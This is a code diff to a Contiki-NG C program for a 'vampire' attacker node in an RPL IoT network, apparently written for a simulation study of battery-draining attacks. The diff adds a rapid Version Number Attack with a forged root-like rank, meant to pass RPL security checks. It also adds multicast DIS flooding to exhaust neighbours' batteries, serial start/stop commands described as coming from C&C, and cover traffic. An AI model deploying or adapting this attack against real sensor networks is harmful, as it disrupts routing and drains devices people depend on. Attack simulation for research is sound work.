@@ -4,9 +4,11 @@
 #include "net/routing/rpl-lite/rpl-icmp6.h"
 #include "net/netstack.h"
 #include "simple-udp.h"
+#include "sys/energest.h"
 #include "sys/node-id.h"
 #include "sys/log.h"
 #include "lib/random.h"
+#include "dev/serial-line.h"
 
 #define LOG_MODULE "VAMPIRE"
 #define LOG_LEVEL LOG_LEVEL_INFO
@@ -14,9 +16,9 @@
 #define SEND_PORT 8765
 
 /* Chu kỳ gửi dữ liệu bình thường */
-#define NORMAL_SEND_INTERVAL (10 * CLOCK_SECOND)
+#define NORMAL_SEND_INTERVAL (60 * CLOCK_SECOND)
 /* Chu kỳ kích hoạt Version Number Attack */
-#define VNA_ATTACK_INTERVAL  (15 * CLOCK_SECOND)
+#define VNA_ATTACK_INTERVAL  (CLOCK_SECOND / 10)
 
 typedef struct {
   uint16_t cluster_id;
@@ -29,8 +31,56 @@ typedef struct {
 
 static struct simple_udp_connection udp_conn;
 
+#define STATUS_INTERVAL   (5 * CLOCK_SECOND)
+#define INITIAL_ENERGY_MJ 15000
+#define VOLTAGE_V        3.0
+#define CURRENT_TX_MA    17.4
+#define CURRENT_RX_MA    20.0
+#define CURRENT_CPU_MA    1.8
+#define CURRENT_LPM_MA    0.0545
+
+static uint32_t residual_mj = INITIAL_ENERGY_MJ;
+static uint32_t last_cpu, last_lpm, last_tx, last_rx;
+static uint32_t sim_start_time;
+static uint8_t node_is_dead = 0;
+
+static double
+energy_tick_and_get_duty(void)
+{
+  if(node_is_dead) {
+    return 0.0;
+  }
+
+  uint32_t cpu = energest_type_time(ENERGEST_TYPE_CPU) - last_cpu;
+  uint32_t lpm = energest_type_time(ENERGEST_TYPE_LPM) - last_lpm;
+  uint32_t tx  = energest_type_time(ENERGEST_TYPE_TRANSMIT) - last_tx;
+  uint32_t rx  = energest_type_time(ENERGEST_TYPE_LISTEN) - last_rx;
+  last_cpu += cpu; last_lpm += lpm; last_tx += tx; last_rx += rx;
+
+  double t_cpu = (double)cpu / ENERGEST_SECOND;
+  double t_lpm = (double)lpm / ENERGEST_SECOND;
+  double t_tx  = (double)tx  / ENERGEST_SECOND;
+  double t_rx  = (double)rx  / ENERGEST_SECOND;
+
+  double consumed_mj = VOLTAGE_V * (CURRENT_CPU_MA * t_cpu + CURRENT_LPM_MA * t_lpm
+                                    + CURRENT_TX_MA  * t_tx  + CURRENT_RX_MA  * t_rx);
+  
+  if(consumed_mj >= (double)residual_mj) {
+    residual_mj = 0;
+  } else {
+    residual_mj -= (uint32_t)consumed_mj;
+  }
+
+  double elapsed_radio_on_s = t_tx + t_rx;
+  double elapsed_total_s = t_cpu + t_lpm;
+  return elapsed_total_s > 0 ? (elapsed_radio_on_s / elapsed_total_s) * 100.0 : 0.0;
+}
+
 PROCESS(vampire_process, "Vampire Attacker Node");
-AUTOSTART_PROCESSES(&vampire_process);
+PROCESS(status_process, "Status reporter");
+AUTOSTART_PROCESSES(&vampire_process, &status_process);
+
+static bool is_attacking = false;
 
 PROCESS_THREAD(vampire_process, ev, data)
 {
@@ -40,6 +90,7 @@ PROCESS_THREAD(vampire_process, ev, data)
   static uint32_t sent_count = 0;
   
   PROCESS_BEGIN();
+  sim_start_time = clock_time();
 
   simple_udp_register(&udp_conn, SEND_PORT, NULL, SEND_PORT, NULL);
   
@@ -48,25 +99,45 @@ PROCESS_THREAD(vampire_process, ev, data)
   /* Bắt đầu chu kỳ gửi gói tin data bình thường để che giấu hành vi */
   etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
   /* Bắt đầu chu kỳ phát tán VNA */
-  etimer_set(&attack_timer, VNA_ATTACK_INTERVAL);
+
 
   while(1) {
     PROCESS_WAIT_EVENT();
+
+    if(ev == serial_line_event_message && data != NULL) {
+      char *msg = (char *)data;
+      if(strncmp(msg, "START_VNA", 9) == 0) {
+        LOG_INFO("Received START_VNA from C&C! Commencing Attack.\n");
+        is_attacking = true;
+        etimer_set(&attack_timer, VNA_ATTACK_INTERVAL);
+      } else if(strncmp(msg, "STOP_VNA", 8) == 0) {
+        LOG_INFO("Received STOP_VNA from C&C! Halting Attack.\n");
+        is_attacking = false;
+        etimer_stop(&attack_timer);
+      }
+    }
+
 
     /* Xử lý phát tán Version Number Attack */
     if(ev == PROCESS_EVENT_TIMER && data == &attack_timer) {
         
         /* Chỉ tấn công nếu node đã tham gia vào mạng RPL (có instance hợp lệ) */
         if(curr_instance.used) {
-            /* Tăng Version Number lên một giá trị tuỳ ý (ví dụ +10 giống HUNSR repo) */
+            /* 1. Tang version number len +5. Nhieu he thong bao mat RPL se drop goi tin neu version nhay vot qua lon. +5 giup DIO trong co ve hop le hon. */
             uint8_t old_version = curr_instance.dag.version;
-            curr_instance.dag.version += 10;
+            curr_instance.dag.version += 5;
             
-            LOG_INFO("ATTACK_VNA: Triggered! Version changed %u -> %u. Broadcasting DIO...\n", 
+            /* 2. Giả mạo Rank thành giá trị cực tốt (như Root - 256). Nếu Rank của attacker quá tệ (ví dụ node ở xa), các node khác có thể bỏ qua version update từ nó. */
+            curr_instance.dag.rank = 256;
+            
+            LOG_INFO("ATTACK_VNA_UPGRADED: Triggered! Version changed %u -> %u. Broadcasting DIO & DIS...\n", 
                      old_version, curr_instance.dag.version);
             
-            /* Ép hệ điều hành phát ra gói tin DIO mang Version mới tới tất cả lân cận */
+            /* 3. Ép hệ điều hành phát ra gói tin DIO mang Version mới và Rank giả mạo tới tất cả lân cận */
             rpl_icmp6_dio_output(NULL);
+
+            /* 4. Tấn công DIS Flooding: Gửi Multicast DIS để ép các node lân cận reset Trickle timer về I_min và đồng loạt xả DIO, gây tốn pin cực nhanh */
+            rpl_icmp6_dis_output(NULL);
         } else {
             LOG_INFO("ATTACK_VNA: Not joined RPL DAG yet, waiting...\n");
         }
@@ -80,10 +151,15 @@ PROCESS_THREAD(vampire_process, ev, data)
          NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
         
         sensor_payload_t p;
-        p.cluster_id = (node_id <= 26) ? 1 : 2;
+        
+        uint8_t root_id = dest_ipaddr.u8[15];
+        if(root_id == 1) p.cluster_id = 1;
+        else if(root_id == 27 || root_id == 0x1b) p.cluster_id = 2;
+        else p.cluster_id = 0;
+        
         p.node_id_f = node_id;
         p.seqno = sent_count++;
-        p.residual_mj = 7200;
+        p.residual_mj = residual_mj;
         p.tx_time = clock_time();
         p.temperature_c = (int16_t)(250 + (random_rand() % 50));
         
@@ -95,3 +171,28 @@ PROCESS_THREAD(vampire_process, ev, data)
   }
   PROCESS_END();
 }
+
+PROCESS_THREAD(status_process, ev, data)
+{
+  static struct etimer et;
+  PROCESS_BEGIN();
+  
+  while(1) {
+    etimer_set(&et, STATUS_INTERVAL);
+    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
+
+    if(node_is_dead) {
+      LOG_INFO("STATUS node=%u STOPPED\n", node_id);
+      PROCESS_EXIT();
+    }
+
+    double duty = energy_tick_and_get_duty();
+    uint16_t rank = curr_instance.dag.rank;
+    LOG_INFO("STATUS node=%u energy_mj=%lu duty_pct=%d rank=%u\n",
+             node_id, (unsigned long)residual_mj, (int)duty, rank);
+  }
+  PROCESS_END();
+}
+
+
+
